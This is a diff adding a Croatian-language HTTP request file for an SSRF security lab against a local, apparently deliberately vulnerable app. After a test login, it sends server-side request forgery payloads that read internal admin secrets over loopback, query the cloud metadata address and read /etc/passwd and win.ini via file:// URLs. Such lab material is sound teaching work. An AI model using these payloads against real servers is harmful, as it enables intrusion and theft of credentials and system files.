@@ -1,0 +1,33 @@
+### Lab03 – SSRF (Server-Side Request Forgery)
+@host = http://localhost:8000
+@token = PASTE_TOKEN
+
+### 1. Prijava (kopiraj token u @token)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{"username": "ana", "password": "Ana123!"}
+
+### 2. EKSPLOATACIJA: SSRF na interni endpoint preko loopbacka
+# URL je URL-enkodiran (: -> %3A, / -> %2F). Ranjivo (main): 200 + tajne. Popravljeno: 400.
+GET {{host}}/api/lab03/preview?url=http%3A%2F%2F127.0.0.1%3A8000%2Finternal%2Fadmin%2Fsecrets
+Authorization: Bearer {{token}}
+
+### 3. EKSPLOATACIJA: preko imena localhost
+GET {{host}}/api/lab03/preview?url=http%3A%2F%2Flocalhost%3A8000%2Finternal%2Fadmin%2Fsecrets
+Authorization: Bearer {{token}}
+
+### 4. EKSPLOATACIJA: cloud metadata adresa
+GET {{host}}/api/lab03/preview?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
+Authorization: Bearer {{token}}
+
+### 5a. EKSPLOATACIJA: file:// shema (Linux/macOS) - urllib podrzava i file://
+GET {{host}}/api/lab03/preview?url=file%3A%2F%2F%2Fetc%2Fpasswd
+Authorization: Bearer {{token}}
+
+### 5b. EKSPLOATACIJA: file:// shema (Windows)
+GET {{host}}/api/lab03/preview?url=file%3A%2F%2F%2FC%3A%2FWindows%2Fwin.ini
+Authorization: Bearer {{token}}
+
+### 6. Izravno na interni endpoint s loopbacka (radi jer je zahtjev lokalni)
+GET {{host}}/internal/admin/secrets
